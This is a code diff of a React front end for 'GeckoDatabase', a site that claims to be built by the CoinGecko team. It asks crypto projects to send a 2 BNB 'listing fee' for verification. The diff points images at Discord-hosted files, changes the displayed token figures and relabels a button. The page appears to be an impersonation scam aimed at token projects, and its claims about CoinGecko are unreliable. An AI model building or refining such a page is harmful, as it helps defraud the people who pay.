@@ -60,7 +60,7 @@ const submit = ()=>{
      <nav className=' text-gray-300'>
   
   <div className=' p-3 pt-4 flex app items-center justify-between'>
-  <img src="../1x/Asset 7.png" alt="" className='md:w-[15%] w-[50%]'/>
+  <img src="https://media.discordapp.net/attachments/974953912689893387/1262622392350408756/Asset_7.png?ex=6697443c&is=6695f2bc&hm=90ca42ddb45ba995b6966411a5531214d1d5afb55aacc50d3baa927c2d88c9e2&=&format=webp&quality=lossless&width=2160&height=484" alt="" className='md:w-[15%] w-[50%]'/>
   
 
   <div className='md:flex hidden justify-between w-[20%] mr-10'>
@@ -82,7 +82,7 @@ const submit = ()=>{
   Verify your project Details directly form the CoinGecko Database
 </p>
 <div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
-<img className='md:w-[2%] w-[7%] rounded-full' src="../1x/ppl.jpeg" alt="" />
+<img className='md:w-[2%] w-[7%] rounded-full' src="https://media.discordapp.net/attachments/974953912689893387/1262650085783769179/ppl.jpeg?ex=66975e07&is=66960c87&hm=4d13081d55da721b52c9f72b9470a34c7c96a9ed2e86880516584b49a86cc3b9&=&format=webp&width=640&height=640" alt="" />
 <p>PEOPLE</p>
 </div>
 
@@ -108,9 +108,9 @@ Database_file
     <p>"decimals": <span className='text-[#CFADE8]'>"18",</span></p>
     <p>"image_url": <span className='text-[#CFADE8]'>"https://storage.googleapis.com/coinsniper-assets/images/6oAcJxhQgSj4qc6p3v9LNDPhdzVjI93g6hVvv8yP.png",</span></p>
     <p>"total_supply": <span className='text-[#CFADE8]'>"500000000000",</span></p>
-    <p>"liquidity": <span className='text-[#CFADE8]'>"225042",</span></p>
-    <p>"volume_24h": <span className='text-[#CFADE8]'>"316048",</span></p>
-    <p>"price_usd": <span className='text-[#CFADE8]'>"0.000003171",</span></p>
+    <p>"liquidity": <span className='text-[#CFADE8]'>"252096",</span></p>
+    <p>"volume_24h": <span className='text-[#CFADE8]'>"340085",</span></p>
+    <p>"price_usd": <span className='text-[#CFADE8]'>"0.000004189",</span></p>
     </div>
     ],</span></p>
 
@@ -142,7 +142,7 @@ Database_file
   
 
   <div className='flex justify-center'>
-<img className='w-[60%]' src="../1x/Asset 4.png" alt="" />
+<img className='w-[60%]' src="https://media.discordapp.net/attachments/974953912689893387/1262650021573169222/Asset_4.png?ex=66975df8&is=66960c78&hm=47ec82374bf6ea15cab6d12abcd596110c40cd76a6473e12d9dd7f9a0237a278&=&format=webp&quality=lossless&width=2160&height=484" alt="" />
 </div>
 </div>
 </div>
@@ -154,7 +154,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
 <p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing fee cost 2 BNB, Endavour to send payment tx for fast verification and approval.</p>
 </div>
 
-<div className='mt-3 app flex justify-between' >
+<div className='mt-3 app flex justify-between'>
 <button className='px-4 py-2 bg-[#66BB6A]' onClick={handleOpen}>Approve Listing</button>
 <button className='px-4 py-2 bg-[#FD5370] flex gap-2 items-center' onClick={submit}><IoConstructSharp className='text-black text-lg'/>Edit details </button>
 </div>
@@ -166,7 +166,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
   <footer className='app text-gray-400'>
     <div className='md:flex p-5  '>
 <section className='md:w-[60%] app '>
-<img src="../1x/Asset 7.png" alt="" className='md:w-[30%] w-[70%]'/>
+<img src="https://media.discordapp.net/attachments/974953912689893387/1262622392350408756/Asset_7.png?ex=6697443c&is=6695f2bc&hm=90ca42ddb45ba995b6966411a5531214d1d5afb55aacc50d3baa927c2d88c9e2&=&format=webp&quality=lossless&width=2160&height=484" alt="" className='md:w-[30%] w-[70%]'/>
 <p className='mt-5 text-xs'>GeckoDatabase is the most fastest and comprehensive real-time DEX tracker, 
   built by the team behind CoinGecko. Helping crypto projects with fast track listings, tokens updates for any project and more on decentralized exchanges across all blockchains.</p>
 </section>
@@ -263,7 +263,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
         <DialogActions>
          
           <button onClick={Close} autoFocus className='w-full app bg-green-600 py-2'>
-            Approve
+            Submit
           </button>
           <button onClick={cancel} autoFocus className='w-full app bg-red-600 py-2'>
             Cancel
